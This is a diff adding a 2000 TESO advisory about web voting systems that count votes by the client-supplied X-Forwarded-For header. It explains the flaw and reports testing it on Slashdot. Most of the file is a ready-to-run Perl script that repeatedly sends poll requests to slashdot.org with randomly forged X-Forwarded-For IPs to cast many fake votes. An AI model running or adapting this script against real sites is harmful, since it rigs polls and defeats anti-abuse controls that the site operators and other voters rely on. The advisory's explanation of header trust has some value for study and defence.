@@ -1,0 +1,74 @@
+0004 2000/01/22  Conceptual bug in webvoting systems with proxy protection
+
+==== TESO Informational =======================================================
+This piece of information is to be kept confidential.
+===============================================================================
+
+Description ..........: Conceptual bug in webvoting systems with protection
+                        against proxy servers
+Date .................: 2000/01/22 20:53
+Author ...............: typo
+Publicity level ......: possibly known
+Affected .............: slashdot webvoting systems, probably others
+Type of entity .......: CGI
+Type of discovery ....: interesting information
+Severity/Importance ..: low
+Found by .............: typo
+
+Information ===================================================================
+
+X-Forwarded-For is the HTTP header field added by proxies in which they store
+the client's real IP. Normally it looks like this:
+
+X-Forwarded-For: 1.2.3.4
+
+meaning that 1.2.3.4 asked the proxy to fetch the page.
+
+Now, most webvoting systems implement proxy protection by accounting votes to
+the IP mentioned in the HTTP X-Forwarded-For: header, if it is set. No one 
+seems to have thought that by sending your own X-Forwarded-For field in a
+non-proxy request, you can get the vote CGI to account your vote to some
+other IP. Tested on Slashdot.
+
+Sample slashdot vote h4x0r Perl script:
+
+#!/usr/bin/perl
+
+use IO::Socket;
+
+$vote  = "votename"; # see url
+$aid   = 8;          # see url
+$times = 50;         # num of votes
+
+for ($i = 1; $i <= $times; $i++) {
+    $cowshit = IO::Socket::INET->new(PeerAddr => "slashdot.org",
+                                 PeerPort => 80,
+                                 Timeout  => 30,
+                                 Proto    => 'tcp');
+
+die "no connect" if (!defined $cowshit);
+
+$cowshit->autoflush(1);
+
+$rand1 = int(rand(254)+1);
+$rand2 = int(rand(254)+1);
+$rand3 = int(rand(254)+1);
+$rand4 = int(rand(254)+1);
+
+$tmp = <<EOF;
+GET /pollBooth.pl?qid=${vote}\&aid=${aid} HTTP/1.0
+User-Agent: Mozilla/4.7 [en] (TeOS; X11)
+Host: slashdot.org:80
+X-Forwarded-For: ${rand1}.${rand2}.${rand3}.${rand4}
+
+EOF
+
+print $tmp;
+print $cowshit $tmp;
+
+  print "voted $i\n";
+  $cowshit->close;
+}
+
+===============================================================================
+
